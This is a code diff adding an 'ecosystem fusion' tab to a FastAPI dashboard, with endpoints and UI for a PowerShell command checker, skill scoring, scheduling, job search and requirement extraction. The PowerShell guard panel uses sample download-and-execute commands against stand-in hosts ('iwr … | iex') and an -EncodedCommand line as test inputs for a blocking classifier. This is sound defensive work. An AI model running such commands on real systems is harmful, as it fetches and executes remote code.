@@ -1550,6 +1550,108 @@ async def api_vault_test_secret(request: Request):
 
 
 # ==============================================================================
+# MY_PROJECTS ECOSYSTEM FUSION ENDPOINTS (16 SIBLING REPOSITORIES UNIFIED)
+# ==============================================================================
+try:
+    from local_model_lab.ecosystem_fusion import (
+        get_ecosystem_fusion_catalog,
+        evaluate_powershell_command,
+        record_code_change,
+        get_change_journal,
+        evaluate_and_evolve_skill,
+        analyze_circadian_and_correlations,
+        correct_voice_transcript,
+        learn_preferences_from_diff,
+        draft_meeting_copilot_response,
+        schedule_task_in_gaps,
+        fetch_geopulse_brief,
+        query_greenhouse_ats_radar,
+        extract_compliance_matrix,
+    )
+except ImportError:
+    from ecosystem_fusion import (
+        get_ecosystem_fusion_catalog,
+        evaluate_powershell_command,
+        record_code_change,
+        get_change_journal,
+        evaluate_and_evolve_skill,
+        analyze_circadian_and_correlations,
+        correct_voice_transcript,
+        learn_preferences_from_diff,
+        draft_meeting_copilot_response,
+        schedule_task_in_gaps,
+        fetch_geopulse_brief,
+        query_greenhouse_ats_radar,
+        extract_compliance_matrix,
+    )
+
+
+@app.get("/api/ecosystem/catalog")
+async def api_ecosystem_catalog():
+    return JSONResponse(content=get_ecosystem_fusion_catalog())
+
+
+@app.post("/api/ecosystem/powershell_check")
+async def api_ecosystem_powershell_check(request: Request):
+    data = await request.json()
+    cmd = str(data.get("command", ""))
+    return JSONResponse(content=evaluate_powershell_command(cmd))
+
+
+@app.post("/api/ecosystem/evolve_skill")
+async def api_ecosystem_evolve_skill(request: Request):
+    data = await request.json()
+    skill_id = str(data.get("skill_id", "executive-orchestrator"))
+    apply_ev = bool(data.get("apply_evolution", False))
+    return JSONResponse(content=evaluate_and_evolve_skill(skill_id=skill_id, apply_evolution=apply_ev))
+
+
+@app.post("/api/ecosystem/schedule_task")
+async def api_ecosystem_schedule_task(request: Request):
+    data = await request.json()
+    task_text = str(data.get("task_text", "Deep work on Laya router for 45 mins"))
+    busy_blocks = data.get("busy_blocks")
+    readiness = data.get("watch_readiness_score")
+    if readiness is None:
+        try:
+            latest_bio = get_watch_health_analyzer().analyze_latest()
+            readiness = latest_bio.get("readiness_score")
+        except Exception:
+            readiness = 85
+    return JSONResponse(
+        content=schedule_task_in_gaps(
+            task_text=task_text,
+            busy_blocks=busy_blocks if isinstance(busy_blocks, list) else None,
+            watch_readiness_score=int(readiness) if readiness is not None else None,
+        )
+    )
+
+
+@app.get("/api/ecosystem/geopulse")
+async def api_ecosystem_geopulse(max_items: int = 8):
+    return JSONResponse(content=fetch_geopulse_brief(max_items=max_items))
+
+
+@app.get("/api/ecosystem/ats_jobs")
+async def api_ecosystem_ats_jobs(company: str = "anthropic", keyword: str = "engineer"):
+    return JSONResponse(content=query_greenhouse_ats_radar(company_slug=company, role_keyword=keyword, max_jobs=12))
+
+
+@app.post("/api/ecosystem/extract_requirements")
+async def api_ecosystem_extract_requirements(request: Request):
+    data = await request.json()
+    doc_text = str(data.get("document_text", ""))
+    return JSONResponse(content=extract_compliance_matrix(doc_text))
+
+
+@app.post("/api/ecosystem/meeting_copilot")
+async def api_ecosystem_meeting_copilot(request: Request):
+    data = await request.json()
+    snippet = str(data.get("transcript_snippet", ""))
+    return JSONResponse(content=draft_meeting_copilot_response(snippet))
+
+
+# ==============================================================================
 # MAIN DASHBOARD UI
 # ==============================================================================
 
@@ -2445,6 +2547,7 @@ def dashboard():
             <button class="tab-btn" onclick="setTab('rpa')">🤖 RPA Studio</button>
             <button class="tab-btn" onclick="setTab('system')">⚡ System Health</button>
             <button class="tab-btn" onclick="setTab('browser')">🌐 Browser Extension</button>
+            <button class="tab-btn" onclick="setTab('ecosystem')" style="border: 1px solid rgba(16, 185, 129, 0.45); color: #34d399; font-weight: 800;">🧬 My_Projects Fusion</button>
             <button class="tab-btn" onclick="setTab('logs')">📜 Audit Trail</button>
             <button class="tab-btn" style="border-color: rgba(56, 189, 248, 0.5); color: #38bdf8;" onclick="toggleNotificationDrawer()">🔔 Alerts <span id="nav-notif-pill" style="background:#ef4444;color:#fff;font-size:10px;padding:1px 6px;border-radius:999px;margin-left:4px;display:none;">0</span></button>
             <button class="tab-btn" style="border-color: rgba(251, 191, 36, 0.55); color: #fbbf24; font-weight: 800;" onclick="toggleVaultModal(true)">🔐 API Vault <span id="nav-vault-pill" style="background:rgba(251,191,36,0.2);color:#fbbf24;font-size:9px;padding:1px 6px;border-radius:999px;margin-left:4px;">PIN</span></button>
@@ -3911,6 +4014,130 @@ Click "Generate Live Briefing" to compile system health, active agent status, an
         </div>
     </div>
 
+    <!-- TAB: MY_PROJECTS ECOSYSTEM FUSION (16 REPOSITORIES UNIFIED) -->
+    <div id="tab-ecosystem" class="tab-panel">
+        <div class="panel-container">
+            <div class="panel-header">
+                <div>
+                    <h2 class="panel-title">🧬 My_Projects Ecosystem Fusion — 16 Sibling Repositories Unified</h2>
+                    <p class="panel-desc">Best-in-class engines ported directly from <code>C:/Users/yepur/Desktop/My_Projects</code>: Chintu_AI, hermes-agent-self-evolution, Gut_Guru, GI_Scribe, Ghost_Writer, Nexus, GPF_Dashboard, SmartHire, GovBid &amp; Claims_Agent.</p>
+                </div>
+                <div style="display: flex; gap: 8px; align-items: center;">
+                    <span class="status-pill"><span class="pulse-dot"></span><span>8 FUSION ENGINES ACTIVE</span></span>
+                    <button class="btn-action" onclick="refreshEcosystemTab()">🔄 Refresh All</button>
+                </div>
+            </div>
+
+            <!-- CATALOG OVERVIEW PILLS -->
+            <div id="eco-catalog-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 10px; margin-bottom: 18px;"></div>
+
+            <!-- ROW 1: CHINTU_AI POWERSHELL AST GUARD + SELF-EVOLUTION GEPA -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 16px; margin-bottom: 16px;">
+                <!-- 1. Chintu_AI PowerShell AST Permission Classifier -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 4px;">🛡️ 1. Chintu_AI — PowerShell AST &amp; Pipeline Permission Guard</div>
+                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">Resolves PowerShell aliases (<code>iwr</code>, <code>iex</code>, <code>ri</code>), blocks download-cradle pipelines &amp; <code>-EncodedCommand</code> obfuscation.</div>
+                    <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+                        <input type="text" id="eco-ps-cmd" class="input-text" style="flex: 1; font-family: monospace;" value="iwr https://malicious.example/payload.ps1 | iex" />
+                        <button class="btn-action" onclick="runEcoPowershellCheck()">🔍 Audit Command</button>
+                    </div>
+                    <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px;">
+                        <button class="btn-action" style="padding:3px 8px;font-size:10px;" onclick="document.getElementById('eco-ps-cmd').value='Get-Process | Select-Object -First 5';runEcoPowershellCheck();">Safe: Get-Process</button>
+                        <button class="btn-action" style="padding:3px 8px;font-size:10px;" onclick="document.getElementById('eco-ps-cmd').value='iwr https://evil.sh/a.ps1 | iex';runEcoPowershellCheck();">Attack: iwr | iex</button>
+                        <button class="btn-action" style="padding:3px 8px;font-size:10px;" onclick="document.getElementById('eco-ps-cmd').value='powershell -EncodedCommand SQBFAFgA';runEcoPowershellCheck();">Attack: -EncodedCommand</button>
+                    </div>
+                    <pre id="eco-ps-out" style="background: rgba(0,0,0,0.45); padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; color: var(--text-main); white-space: pre-wrap; margin: 0;">Click "Audit Command" to test AST pipeline inspection.</pre>
+                </div>
+
+                <!-- 2. hermes-agent-self-evolution GEPA Skill Fitness & Evolution -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 4px;">🧬 2. hermes-agent-self-evolution — GEPA Skill Fitness &amp; Auto-Evolver</div>
+                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">Scores <code>SKILL.md</code> playbooks on Correctness (50%), Procedure (30%), Conciseness (20%) &amp; 4 structural constraints.</div>
+                    <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+                        <select id="eco-skill-select" class="input-select" style="flex: 1;">
+                            <option value="executive-orchestrator">CEO — executive-orchestrator</option>
+                            <option value="product-discovery-prd">PM — product-discovery-prd</option>
+                            <option value="staff-systems-architect">ARCHITECT — staff-systems-architect</option>
+                            <option value="polyglot-staff-coder">CODER — polyglot-staff-coder</option>
+                            <option value="principal-qa-chaos-tester">TESTER — principal-qa-chaos-tester</option>
+                            <option value="ciso-redteam-security-auditor">SECURITY — ciso-redteam-security-auditor</option>
+                            <option value="principal-sre-devops">DEVOPS — principal-sre-devops</option>
+                            <option value="desktop-chintu-operator">OPERATOR — desktop-chintu-operator</option>
+                            <option value="deep-research-deal-hunter">RESEARCHER — deep-research-deal-hunter</option>
+                            <option value="staff-uiux-paper-designer">DESIGNER — staff-uiux-paper-designer</option>
+                        </select>
+                        <button class="btn-action" onclick="runEcoSkillEval(false)">📊 Score Fitness</button>
+                        <button class="btn-action" style="border-color:#10b981;color:#10b981;" onclick="runEcoSkillEval(true)">✨ Evolve SKILL.md</button>
+                    </div>
+                    <pre id="eco-skill-out" style="background: rgba(0,0,0,0.45); padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; color: var(--text-main); white-space: pre-wrap; margin: 0;">Select a specialist SKILL.md above to score GEPA fitness.</pre>
+                </div>
+            </div>
+
+            <!-- ROW 2: NEXUS BIO-ADAPTIVE SCHEDULER + GI_SCRIBE/GHOST_WRITER COPILOT -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 16px; margin-bottom: 16px;">
+                <!-- 3. Nexus Bio-Adaptive Gap Scheduler -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 4px;">📅 3. Nexus Life OS — Watch 8 Bio-Adaptive Calendar Gap Scheduler</div>
+                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">Parses natural-language tasks and slots cognitive deep work into free calendar gaps weighted by your live Galaxy Watch 8 Readiness Score.</div>
+                    <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+                        <input type="text" id="eco-sched-task" class="input-text" style="flex: 1;" value="Deep work on Laya System-1 router calibration for 45 mins" />
+                        <button class="btn-action" onclick="runEcoScheduleTask()">⚡ Slot Into Gap</button>
+                    </div>
+                    <pre id="eco-sched-out" style="background: rgba(0,0,0,0.45); padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; color: var(--text-main); white-space: pre-wrap; margin: 0;">Click "Slot Into Gap" to compute optimal bio-adaptive slot.</pre>
+                </div>
+
+                <!-- 4. GI_Scribe & Ghost_Writer Acoustic STT + Live Meeting Copilot -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 4px;">🎙️ 4. GI_Scribe &amp; Ghost_Writer — Phonetic STT &amp; Meeting Copilot</div>
+                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">Fixes misheard voice terms (<code>"chew into" &rarr; "Chintu"</code>, <code>"lay a router" &rarr; "Laya router"</code>) and drafts executive talking points.</div>
+                    <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+                        <input type="text" id="eco-copilot-in" class="input-text" style="flex: 1;" value="Can you explain how chew into browser and lay a router handle oh llama failover? We will ship the benchmark by Friday." />
+                        <button class="btn-action" onclick="runEcoMeetingCopilot()">🧠 Assist</button>
+                    </div>
+                    <pre id="eco-copilot-out" style="background: rgba(0,0,0,0.45); padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; color: var(--text-main); white-space: pre-wrap; margin: 0;">Click "Assist" to run phonetic STT correction &amp; meeting copilot.</pre>
+                </div>
+            </div>
+
+            <!-- ROW 3: GEOPULSE MACRO RADAR + SMARTHIRE ATS + GOVBID/CLAIMS EXTRACTOR -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px;">
+                <!-- 5. GPF_Dashboard GeoPulse Macro Radar -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                        <div style="font-size: 13px; font-weight: 800; color: var(--text-heading);">🌍 5. GPF_Dashboard — GeoPulse Macro &amp; Market Impact</div>
+                        <button class="btn-action" style="padding: 3px 8px; font-size: 10px;" onclick="runEcoGeopulse()">🔄 Pull Live Feeds</button>
+                    </div>
+                    <div id="eco-geopulse-out" style="font-size: 11px; color: var(--text-main); max-height: 220px; overflow-y: auto;">Click "Pull Live Feeds" to scan macro RSS &amp; ticker impacts.</div>
+                </div>
+
+                <!-- 6. SmartHire Public ATS Job Radar -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 6px;">💼 6. SmartHire — Direct Greenhouse ATS Radar</div>
+                    <div style="display: flex; gap: 6px; margin-bottom: 8px;">
+                        <select id="eco-ats-company" class="input-select">
+                            <option value="anthropic">Anthropic</option>
+                            <option value="databricks">Databricks</option>
+                            <option value="stripe">Stripe</option>
+                            <option value="cloudflare">Cloudflare</option>
+                            <option value="scaleai">Scale AI</option>
+                            <option value="coinbase">Coinbase</option>
+                        </select>
+                        <input type="text" id="eco-ats-kw" class="input-text" value="ai" style="width: 90px;" placeholder="Keyword" />
+                        <button class="btn-action" onclick="runEcoAtsRadar()">🔎 Scan</button>
+                    </div>
+                    <div id="eco-ats-out" style="font-size: 11px; color: var(--text-main); max-height: 190px; overflow-y: auto;">Select company and click "Scan".</div>
+                </div>
+
+                <!-- 7. GovBid & Claims_Agent Requirement & Red-Flag Extractor -->
+                <div style="background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px;">
+                    <div style="font-size: 13px; font-weight: 800; color: var(--text-heading); margin-bottom: 6px;">📑 7. GovBid &amp; Claims_Agent — Compliance Matrix</div>
+                    <textarea id="eco-req-text" class="input-text" style="width: 100%; height: 64px; font-size: 11px; margin-bottom: 6px;">The Contractor SHALL encrypt all API keys with AES-256-GCM. The Vendor MUST deliver 99.9% uptime. Contractor agrees to unlimited liability and unilateral termination without cause.</textarea>
+                    <button class="btn-action" style="width: 100%; justify-content: center; margin-bottom: 6px;" onclick="runEcoExtractReqs()">⚖️ Extract SHALL/MUST &amp; Red Flags</button>
+                    <pre id="eco-req-out" style="background: rgba(0,0,0,0.45); padding: 8px; border-radius: 6px; font-size: 10.5px; font-family: monospace; color: var(--text-main); white-space: pre-wrap; max-height: 120px; overflow-y: auto; margin: 0;"></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- TOAST POPUP -->
     <div id="toast">
         <span>&check;</span>
@@ -3944,7 +4171,156 @@ Click "Generate Live Briefing" to compile system health, active agent status, an
             if (tabId === 'mesh') refreshMeshDevices();
             if (tabId === 'rpa') refreshMacros();
             if (tabId === 'system') refreshSystemHealth();
+            if (tabId === 'ecosystem') refreshEcosystemTab();
             if (tabId === 'logs') refreshStepLogsStream();
+        }
+
+        async function refreshEcosystemTab() {
+            try {
+                const res = await fetch('/api/ecosystem/catalog');
+                const data = await res.json();
+                const grid = document.getElementById('eco-catalog-grid');
+                if (grid && data.modules) {
+                    grid.innerHTML = data.modules.map(m => `
+                        <div style="background: var(--bg-card-alt); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 10px 12px;">
+                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                <span style="font-size:11px;font-weight:800;color:#34d399;">${m.source_project}</span>
+                                <span style="font-size:9px;background:rgba(16,185,129,0.18);color:#10b981;padding:1px 6px;border-radius:999px;font-weight:700;">${m.status}</span>
+                            </div>
+                            <div style="font-size:12px;font-weight:700;color:#fff;margin-top:3px;">${m.capability}</div>
+                            <div style="font-size:10px;color:var(--text-muted);font-family:monospace;margin-top:2px;">${m.entrypoint}</div>
+                        </div>
+                    `).join('');
+                }
+                runEcoPowershellCheck();
+                runEcoSkillEval(false);
+                runEcoScheduleTask();
+                runEcoMeetingCopilot();
+                runEcoExtractReqs();
+            } catch (e) {
+                console.error('Ecosystem tab error:', e);
+            }
+        }
+
+        async function runEcoPowershellCheck() {
+            const cmd = document.getElementById('eco-ps-cmd')?.value || '';
+            const out = document.getElementById('eco-ps-out');
+            try {
+                const res = await fetch('/api/ecosystem/powershell_check', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: cmd })
+                });
+                const d = await res.json();
+                if (out) out.innerText = JSON.stringify(d, null, 2);
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoSkillEval(applyEv) {
+            const skillId = document.getElementById('eco-skill-select')?.value || 'executive-orchestrator';
+            const out = document.getElementById('eco-skill-out');
+            try {
+                const res = await fetch('/api/ecosystem/evolve_skill', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ skill_id: skillId, apply_evolution: !!applyEv })
+                });
+                const d = await res.json();
+                if (out) out.innerText = JSON.stringify(d, null, 2);
+                if (applyEv) showToast('✨ Evolved ' + skillId + ' SKILL.md!');
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoScheduleTask() {
+            const taskText = document.getElementById('eco-sched-task')?.value || '';
+            const out = document.getElementById('eco-sched-out');
+            try {
+                const res = await fetch('/api/ecosystem/schedule_task', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ task_text: taskText })
+                });
+                const d = await res.json();
+                if (out) out.innerText = JSON.stringify(d, null, 2);
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoMeetingCopilot() {
+            const txt = document.getElementById('eco-copilot-in')?.value || '';
+            const out = document.getElementById('eco-copilot-out');
+            try {
+                const res = await fetch('/api/ecosystem/meeting_copilot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ transcript_snippet: txt })
+                });
+                const d = await res.json();
+                if (out) out.innerText = JSON.stringify(d, null, 2);
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoGeopulse() {
+            const out = document.getElementById('eco-geopulse-out');
+            if (out) out.innerText = 'Fetching live macro RSS feeds...';
+            try {
+                const res = await fetch('/api/ecosystem/geopulse?max_items=6');
+                const d = await res.json();
+                if (out && d.items) {
+                    out.innerHTML = d.items.map(it => `
+                        <div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
+                            <div style="font-weight:700;color:#f8fafc;">[${it.source}] ${it.title}</div>
+                            <div style="font-size:10px;color:#38bdf8;margin-top:2px;">Sectors: ${(it.affected_sectors||[]).join(', ')} • Tickers: ${(it.tickers||[]).join(', ')}</div>
+                        </div>
+                    `).join('');
+                }
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoAtsRadar() {
+            const comp = document.getElementById('eco-ats-company')?.value || 'anthropic';
+            const kw = document.getElementById('eco-ats-kw')?.value || 'ai';
+            const out = document.getElementById('eco-ats-out');
+            if (out) out.innerText = 'Scanning Greenhouse ATS board...';
+            try {
+                const res = await fetch(`/api/ecosystem/ats_jobs?company=${encodeURIComponent(comp)}&keyword=${encodeURIComponent(kw)}`);
+                const d = await res.json();
+                if (out) {
+                    if (d.jobs && d.jobs.length) {
+                        out.innerHTML = `<div style="font-size:10px;color:#10b981;margin-bottom:4px;">Matched ${d.matched_jobs} / ${d.total_board_openings} openings at ${d.company.toUpperCase()}</div>` +
+                            d.jobs.map(j => `<div style="padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.05);"><a href="${j.url}" target="_blank" style="color:#38bdf8;font-weight:700;text-decoration:none;">${j.title}</a> <span style="color:var(--text-muted);font-size:10px;">(${j.location})</span></div>`).join('');
+                    } else {
+                        out.innerText = JSON.stringify(d, null, 2);
+                    }
+                }
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
+        }
+
+        async function runEcoExtractReqs() {
+            const txt = document.getElementById('eco-req-text')?.value || '';
+            const out = document.getElementById('eco-req-out');
+            try {
+                const res = await fetch('/api/ecosystem/extract_requirements', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ document_text: txt })
+                });
+                const d = await res.json();
+                if (out) out.innerText = JSON.stringify(d, null, 2);
+            } catch (e) {
+                if (out) out.innerText = 'Error: ' + e;
+            }
         }
 
         function toggleEmpLogs(role) {
